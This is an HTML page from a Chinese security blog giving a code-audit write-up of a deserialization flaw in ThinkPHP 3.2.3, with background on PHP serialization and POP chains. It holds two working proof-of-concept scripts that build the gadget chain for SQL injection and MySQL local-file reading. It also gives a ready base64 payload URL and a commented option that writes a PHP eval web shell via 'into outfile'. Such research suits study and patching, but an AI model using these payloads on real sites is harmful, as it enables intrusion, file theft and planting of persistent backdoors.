@@ -1,0 +1,699 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>PHP代码审计—ThinkPHP3.2.3反序列化 | bewhale&#39;s blog</title>
+
+<link rel="shortcut icon" href="https://bewhale.github.io/favicon.ico?v=1666713403567">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://bewhale.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+    
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            bewhale&#39;s blog
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/tools" class="menu gt-a-link">
+                    在线工具
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1666713403567"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    PHP代码审计—ThinkPHP3.2.3反序列化
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-02 ·
+                    </time>
+                    
+                        <a href="https://bewhale.github.io/tag/zuB-zqMRV/" class="post-tags">
+                            # PHP代码审计
+                        </a>
+                    
+                        <a href="https://bewhale.github.io/tag/I8zfItXpKf/" class="post-tags">
+                            # ThinkPHP
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="基本概念">基本概念</h1>
+<h2 id="序列化">序列化</h2>
+<p>所有 PHP 里面的值都可以使用 serialize() 函数将其转换为一个可以存储的字符串，也就是序列化。</p>
+<p>所谓序列化，就是将一个在内存中的变量转换为可保存或传输的字符串的过程。</p>
+<p>序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p>
+<p>另外，为了能够反序列化一个对象，这个对象的类必须已经定义过。</p>
+<p>如果序列化类 A 的一个对象，将会返回一个跟类 A 相关，而且包含了对象所有变量值的字符串。</p>
+<h2 id="反序列化">反序列化</h2>
+<p>反序列化就是在适当的时候使用unserialize()函数把序列化字符串再转化成原来的变量使用。</p>
+<p>这两个过程结合起来可以轻松的完成数据的存储和传输操作，使得程序更具维护性。</p>
+<h2 id="魔术方法">魔术方法</h2>
+<p>我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法</p>
+<p>常用的一些魔术方法:</p>
+<pre><code class="language-php">__wakeup， unserialize() 执行前调用
+__destruct， 对销毁的时候调用
+__toString， 类被当成字符串时的回应方法
+__construct()，当对象创建(new)时会自动调用，注意在unserialize()时并不会自动调用
+__sleep()，serialize()时会先被调用
+__call()，在对象中调用一个不可访问方法时调用
+__callStatic()，用静态方式中调用一个不可访问方法时调用
+__get()，获得一个类的成员变量时调用
+__set()，设置一个类的成员变量时调用
+__isset()，当对不可访问属性调用isset()或empty()时调用
+__unset()，当对不可访问属性调用unset()时被调用。
+__wakeup()，执行unserialize()时，先会调用这个函数
+__toString()，类被当成字符串时的回应方法
+__invoke()，调用函数的方式调用一个对象时的回应方法
+__set_state()，调用var_export()导出类时，此静态方法会被调用。
+__clone()，当对象复制完成时调用
+__autoload()，尝试加载未定义的类
+__debugInfo()，打印所需调试信息
+</code></pre>
+<h2 id="pop">POP</h2>
+<blockquote>
+<p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p>
+</blockquote>
+<p>POP 链的构造是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据需要能够被用户输入所控制。</p>
+<h2 id="常见漏洞点">常见漏洞点</h2>
+<h3 id="反序列化的常见起点">反序列化的常见起点</h3>
+<ul>
+<li>__wakeup 一定会调用</li>
+<li>__destruct 一定会调用</li>
+<li>__toString 当一个对象被反序列化后又被当做字符串使用</li>
+</ul>
+<h3 id="反序列化的常见终点">反序列化的常见终点</h3>
+<ul>
+<li>__call 调用不可访问或不存在的方法时被调用</li>
+<li>call_user_func 一般php代码执行都会选择这里</li>
+<li>call_user_func_array 一般php代码执行都会选择这里</li>
+</ul>
+<h3 id="反序列化的常见中间跳板">反序列化的常见中间跳板</h3>
+<ul>
+<li>__toString 当一个对象被当做字符串使用</li>
+<li>__get 读取不可访问或不存在属性时被调用</li>
+<li>__set 当给不可访问或不存在属性赋值时被调用</li>
+<li>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</li>
+</ul>
+<h3 id="反序列化的常见终点-2">反序列化的常见终点:</h3>
+<ul>
+<li>__call 调用不可访问或不存在的方法时被调用</li>
+<li>call_user_func 一般php代码执行都会选择这里</li>
+<li>call_user_func_array 一般php代码执行都会选择这里</li>
+</ul>
+<h3 id="phar反序列化原理以及特征">Phar反序列化原理以及特征</h3>
+<p>phar://伪协议会在多个函数中反序列化其metadata部分<br>
+受影响的函数包括不限于如下:</p>
+<pre><code class="language-php">copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,
+fileinode,filemtime,fileowner,fileperms,
+fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,
+is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,
+imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,
+get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo
+</code></pre>
+<h1 id="环境搭建">环境搭建</h1>
+<ul>
+<li>PHPstudy</li>
+</ul>
+<ul>
+<li>PHP: <code>5.6.9nts</code></li>
+<li>ThinkPHP: <code>3.2.3</code></li>
+</ul>
+<p>Index控制器添加test方法,实现一个可控的反序列化的点</p>
+<p>路径： /Application/Home/Controller/IndexController.class.php</p>
+<pre><code class="language-php">&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function index(){
+        $this-&gt;show('&lt;style type=&quot;text/css&quot;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &quot;微软雅黑&quot;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V{$Think.version}&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://ad.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;thinkad id=&quot;ad_55e75dfae343f5a1&quot;&gt;&lt;/thinkad&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;','utf-8');
+    }
+
+    public function test(){
+        unserialize(base64_decode($_GET[x]));
+    }
+}
+</code></pre>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>通过pop 链构造，可实现<code>报错注入</code>和<code>MySQL恶意服务端读取客户端文件</code></p>
+<p>因为PDO默认是支持多语句查询的，所以这个点是可以堆叠注入的，可以尝试写shell</p>
+<h2 id="pop-链构造">pop 链构造</h2>
+<p>最终利用链</p>
+<pre><code>__destruct()-&gt;destroy()-&gt;delete()-&gt;Driver::delete()-&gt;Driver::execute()-&gt;Driver::initConnect()-&gt;Driver::connect()-&gt;
+</code></pre>
+<p>poc1</p>
+<pre><code class="language-php">&lt;?php
+//初始化数据库连接
+namespace Think\Db\Driver {
+    use PDO;
+    class Mysql
+    {
+        protected $options = array(
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true    // 开启才能读取文件
+        );
+        protected $config = array(
+            &quot;debug&quot; =&gt; 1,
+            &quot;database&quot; =&gt; &quot;thinkphp&quot;,    //数据库名
+            &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;,    //地址
+            &quot;hostport&quot; =&gt; &quot;3306&quot;,    //端口
+            &quot;charset&quot; =&gt; &quot;utf8&quot;,
+            &quot;username&quot; =&gt; &quot;root&quot;,    //用户名
+            &quot;password&quot; =&gt; &quot;root&quot;    //密码
+        );
+    }
+}
+
+namespace Think\Image\Driver {
+    use Think\Session\Driver\Memcache;
+    class Imagick
+    {
+        private $img;
+        public function __construct()
+        {
+            $this-&gt;img = new Memcache();
+        }
+    }
+}
+
+namespace Think\Session\Driver {
+    use Think\Model;
+    class Memcache
+    {
+        protected $handle;
+        public function __construct()
+        {
+            $this-&gt;handle = new Model();
+        }
+    }
+}
+
+namespace Think {
+    use Think\Db\Driver\Mysql;
+    class Model
+    {
+        protected $options = array();
+        protected $pk;
+        protected $data = array();
+        protected $db = null;
+        public function __construct()
+        {
+
+            $this-&gt;db = new Mysql();
+            $this-&gt;options['where'] = '';
+            $this-&gt;pk = 'id';
+            $this-&gt;data[$this-&gt;pk] = array(
+                &quot;where&quot; =&gt; &quot; &quot; // where不能为空
+                &quot;table&quot; =&gt; &quot;mysql.users where 1=updatexml(1,user(),1)#&quot;,
+                // 写shell
+				// &quot;table&quot;=&gt;&quot;mysql.user where 1=2;select \&quot;&lt;?php eval(\$_POST[0]);?&gt;\&quot; into outfile \&quot;D:\\\\phpstudy_pro\\\\WWW\\\\1.php\&quot;#&quot;,
+            );
+        }
+    }
+}
+
+namespace {
+
+    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
+}
+</code></pre>
+<p>http://192.168.1.8/index.php?m=Home&amp;c=Index&amp;a=test&amp;x=TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjk5OiJteXNxbC51c2VyIHdoZXJlIDE9MjtzZWxlY3QgIjw/cGhwIGV2YWwoJF9QT1NUWzBdKTs/PiIgaW50byBvdXRmaWxlICJEOlxccGhwc3R1ZHlfcHJvXFxXV1dcXDEucGhwIiMiO3M6NToid2hlcmUiO3M6MToiICI7fX1zOjU6IgAqAGRiIjtPOjIxOiJUaGlua1xEYlxEcml2ZXJcTXlzcWwiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7aToxMDAxO2I6MTt9czo5OiIAKgBjb25maWciO2E6Nzp7czo1OiJkZWJ1ZyI7aToxO3M6ODoiZGF0YWJhc2UiO3M6ODoidGhpbmtwaHAiO3M6ODoiaG9zdG5hbWUiO3M6OToiMTI3LjAuMC4xIjtzOjg6Imhvc3Rwb3J0IjtzOjQ6IjMzMDYiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6ODoicGFzc3dvcmQiO3M6NDoicm9vdCI7fX19fX0=</p>
+<p>poc2</p>
+<pre><code class="language-php">&lt;?php
+namespace Think\Image\Driver{
+
+    use Think\Session\Driver\Memcache;
+
+    class Imagick
+    {
+        private $img;
+
+        public function __construct()
+        {
+            $this-&gt;img = new Memcache();
+        }
+    }
+}
+namespace Think\Session\Driver{
+
+    use Think\Model;
+
+    class Memcache
+    {
+        protected $handle;
+        public function __construct(){
+            $this-&gt;handle = new Model();
+        }
+    }
+}
+namespace Think {
+
+    use Think\Db\Driver\Mysql;
+
+    class Model
+    {
+        protected $pk;
+        protected $db;
+        protected $data;
+        public function __construct(){
+            $this-&gt;pk = 'id';
+            $this-&gt;data[$this-&gt;pk] = array(
+                'where'=&gt;'1=1',
+                'table'=&gt;'mysql.users where 1=updatexml(1,concat(0x7e,database(),0x7e),1)#'
+            );
+            $this-&gt;db = new Mysql();
+        }
+    }
+}
+namespace Think\Db\Driver{
+    use PDO;
+    class Mysql
+    {
+        protected $config     = array(
+            'type'              =&gt;  'mysql',     // 数据库类型
+            'hostname'          =&gt;  '127.0.0.1', // 服务器地址
+            'database'          =&gt;  'thinkphp',          // 数据库名
+            'username'          =&gt;  'root',      // 用户名
+            'password'          =&gt;  'root',          // 密码
+            'hostport'          =&gt;  '3306',        // 端口
+            'dsn'               =&gt;  '', //
+            'params'            =&gt;  array(), // 数据库连接参数
+            'charset'           =&gt;  'utf8',      // 数据库编码默认采用utf8
+            'prefix'            =&gt;  '',    // 数据库表前缀
+            'debug'             =&gt;  true, // 数据库调试模式
+            'deploy'            =&gt;  0, // 数据库部署方式:0 集中式(单一服务器),1 分布式(主从服务器)
+            'rw_separate'       =&gt;  false,       // 数据库读写是否分离 主从式有效
+            'master_num'        =&gt;  1, // 读写分离后 主服务器数量
+            'slave_no'          =&gt;  '', // 指定从服务器序号
+            'db_like_fields'    =&gt;  '',
+        );
+        protected $options = array(
+            PDO::ATTR_CASE              =&gt;  PDO::CASE_LOWER,
+            PDO::ATTR_ERRMODE           =&gt;  PDO::ERRMODE_EXCEPTION,
+            PDO::ATTR_ORACLE_NULLS      =&gt;  PDO::NULL_NATURAL,
+            PDO::ATTR_STRINGIFY_FETCHES =&gt;  false,
+            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true,    //读取本地文件
+            PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true,    //把堆叠开了
+        );
+    }
+}
+
+namespace {
+    echo base64_encode(serialize(new \Think\Image\Driver\Imagick()));
+}
+</code></pre>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>先从<code>__destruct</code>方法入手，全局搜索</p>
+<p>路径：<code>ThinkPHP/Library/Think/Image/Driver/Imagick.class.php</code></p>
+<pre><code class="language-php">    /**
+     * 析构方法，用于销毁图像资源
+     */
+    public function __destruct() {
+        empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
+    }
+</code></pre>
+<p>参数<code>$this-&gt;img</code> 是本类中<code>$img</code>这个成员变量，是完全可控的，并且调用了<code>$this-&gt;img</code>的destroy()，</p>
+<p>全局搜索<code>destroy</code>方法, 来寻找一个含有destroy()成员方法的跳板类，跟进</p>
+<p>路径：<code>ThinkPHP/Library/Think/Session/Driver/Memcache.class.php</code></p>
+<pre><code class="language-php">    /**
+     * 删除Session 
+     * @access public 
+     * @param string $sessID 
+     */
+	public function destroy($sessID) {
+		return $this-&gt;handle-&gt;delete($this-&gt;sessionName.$sessID);
+	}
+</code></pre>
+<p><code>$this-&gt;handle</code>，<code>$this-&gt;sessionName</code>参数可控</p>
+<p>无参数调用函数在 php7 中会判错，但是 php5 不会，所以版本利用有限</p>
+<p>跟进<code>delete</code>方法</p>
+<p>路径：<code>ThinkPHP/Mode/Lite/Model.class.php</code></p>
+<pre><code class="language-php">   public function delete($options = array())
+    {
+    
+        $pk = $this-&gt;getPk();
+        if (empty($options) &amp;&amp; empty($this-&gt;options['where'])) {
+    
+            
+            if (!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk])) {
+    
+                return $this-&gt;delete($this-&gt;data[$pk]);
+            } else {
+    
+                return false;
+            }
+
+        }
+        if (is_numeric($options) || is_string($options)) {
+    
+            
+            if (strpos($options, ',')) {
+    
+                $where[$pk] = array('IN', $options);
+            } else {
+    
+                $where[$pk] = $options;
+            }
+            $options          = array();
+            $options['where'] = $where;
+        }
+        
+        if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) {
+    
+            $count = 0;
+            foreach (array_keys($options) as $key) {
+    
+                if (is_int($key)) {
+    
+                    $count++;
+                }
+
+            }
+            if (count($pk) == $count) {
+    
+                $i = 0;
+                foreach ($pk as $field) {
+    
+                    $where[$field] = $options[$i];
+                    unset($options[$i++]);
+                }
+                $options['where'] = $where;
+            } else {
+    
+                return false;
+            }
+        }
+        
+        $options = $this-&gt;_parseOptions($options);
+        if (empty($options['where'])) {
+    
+            
+            return false;
+        }
+        if (is_array($options['where']) &amp;&amp; isset($options['where'][$pk])) {
+    
+            $pkValue = $options['where'][$pk];
+        }
+
+        if (false === $this-&gt;_before_delete($options)) {
+    
+            return false;
+        }
+        $result = $this-&gt;db-&gt;delete($options);		
+        if (false !== $result &amp;&amp; is_numeric($result)) {
+    
+            $data = array();
+            if (isset($pkValue)) {
+    
+                $data[$pk] = $pkValue;
+            }
+
+            $this-&gt;_after_delete($data, $options);
+        }
+        
+        return $result;
+    }
+
+
+</code></pre>
+<p>在第二次调用<code>delete</code>方法时，调用了数据库驱动类中的<code>delete</code></p>
+<p>路径：<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p>
+<pre><code class="language-php"> public function delete($options = array())
+    {
+    
+        $this-&gt;model = $options['model'];
+        $this-&gt;parseBind(!empty($options['bind']) ? $options['bind'] : array());
+        $table = $this-&gt;parseTable($options['table']);
+        $sql   = 'DELETE FROM ' . $table;
+        if (strpos($table, ',')) {
+    
+
+            if (!empty($options['using'])) {
+    
+                $sql .= ' USING ' . $this-&gt;parseTable($options['using']) . ' ';
+            }
+            $sql .= $this-&gt;parseJoin(!empty($options['join']) ? $options['join'] : '');
+        }
+        $sql .= $this-&gt;parseWhere(!empty($options['where']) ? $options['where'] : '');
+        if (!strpos($table, ',')) {
+    
+            
+            $sql .= $this-&gt;parseOrder(!empty($options['order']) ? $options['order'] : '')
+            . $this-&gt;parseLimit(!empty($options['limit']) ? $options['limit'] : '');
+        }
+        $sql .= $this-&gt;parseComment(!empty($options['comment']) ? $options['comment'] : '');
+        return $this-&gt;execute($sql, !empty($options['fetch_sql']) ? true : false);
+    }
+
+
+
+</code></pre>
+<p>关键代码：</p>
+<pre><code class="language-php">$table = $this-&gt;parseTable($options['table']);
+$sql   = 'DELETE FROM ' . $table;
+return $this-&gt;execute($sql, !empty($options['fetch_sql']) ? true : false);
+</code></pre>
+<p>这里<code>$table</code>经过<code>parseTable</code>函数后拼接到 sql 语句中，最后执行 sql 语句</p>
+<p>跟进<code>parseTable</code></p>
+<pre><code class="language-php"> protected function parseTable($tables)
+    {
+    
+        if (is_array($tables)) {
+    
+
+            $array = array();
+            foreach ($tables as $table =&gt; $alias) {
+    
+                if (!is_numeric($table)) {
+    
+                    $array[] = $this-&gt;parseKey($table) . ' ' . $this-&gt;parseKey($alias);
+                } else {
+    
+                    $array[] = $this-&gt;parseKey($alias);
+                }
+
+            }
+            $tables = $array;
+        } elseif (is_string($tables)) {
+    
+            $tables = explode(',', $tables);
+            array_walk($tables, array(&amp;$this, 'parseKey'));
+        }
+        return implode(',', $tables);
+    }
+
+
+</code></pre>
+<p>其中的数据经过<code>parseKey</code>处理，跟进</p>
+<pre><code class="language-php"> protected function parseKey(&amp;$key)
+    {
+        return $key;
+    }
+</code></pre>
+<p>直接返回，无任何过滤, 那么最后返回结果执行<code>execute</code>方法</p>
+<p>跟进，该函数开头有初始化连接操作</p>
+<pre><code class="language-php">$this-&gt;initConnect(true);
+</code></pre>
+<p>跟进</p>
+<pre><code class="language-php"> protected function initConnect($master = true)
+    {
+    
+        if (!empty($this-&gt;config['deploy']))
+        
+        {
+    
+            $this-&gt;_linkID = $this-&gt;multiConnect($master);
+        } else
+        
+        if (!$this-&gt;_linkID) {
+    
+            $this-&gt;_linkID = $this-&gt;connect();
+        }
+
+    }
+
+
+</code></pre>
+<p>再跟进<code>connect</code></p>
+<pre><code class="language-php"> public function connect($config = '', $linkNum = 0, $autoConnection = false)
+    {
+        if (!isset($this-&gt;linkID[$linkNum])) {
+            if (empty($config)) {
+                $config = $this-&gt;config;
+            }
+            try {
+                if (empty($config['dsn'])) {
+                    $config['dsn'] = $this-&gt;parseDsn($config);
+                }
+                if (version_compare(PHP_VERSION, '5.3.6', '&lt;=')) {
+                  
+                    $this-&gt;options[PDO::ATTR_EMULATE_PREPARES] = false;
+                }
+                $this-&gt;linkID[$linkNum] = new PDO($config['dsn'], $config['username'], $config['password'], $this-&gt;options);
+            } catch (\PDOException $e) {
+    
+                if ($autoConnection) {
+    
+                    trace($e-&gt;getMessage(), '', 'ERR');
+                    return $this-&gt;connect($autoConnection, $linkNum);
+                } elseif ($config['debug']) {
+    
+                    E($e-&gt;getMessage());
+                }
+            }
+        }
+        return $this-&gt;linkID[$linkNum];
+    }
+
+
+</code></pre>
+<p>这里控制 <code>$this-&gt;config</code> 来连接数据库，用 mysql 类来实例化,接着去执行前面拼接的<code>DELETE</code>SQL语句</p>
+<p>因此我们只需要在 Mysql 下配置好数据库配置即可</p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="http://c.biancheng.net/view/8223.html">PHP serialize()与unserialize()：序列化与反序列化</a></p>
+<p><a href="http://www.yongsheng.site/2021/08/30/ThinkPHP3.2.3%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&amp;sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 3.2.3 反序列化&amp;sql注入漏洞分析 | Y0ng的博客</a></p>
+<p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链</a></p>
+<p><a href="https://blog.csdn.net/LYJ20010728/article/details/119551186">ThinkPHP3.2.x （SQL注入&amp;文件读取）反序列化POP链_H3rmesk1t的博客-CSDN博客</a></p>
+<p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">挖掘暗藏ThinkPHP中的反序列利用链 - 斗象能力中心</a></p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://bewhale.github.io/post/PHP代码审计—ThinkPHP3.2.X远程代码执行/" class="post-title gt-a-link">
+                    PHP代码审计—ThinkPHP3.2.X远程代码执行
+                </a>
+            </div>
+        
+
+        
+
+        
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first"></div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/bewhale" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/bewhale" target="_blank">bewhale</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
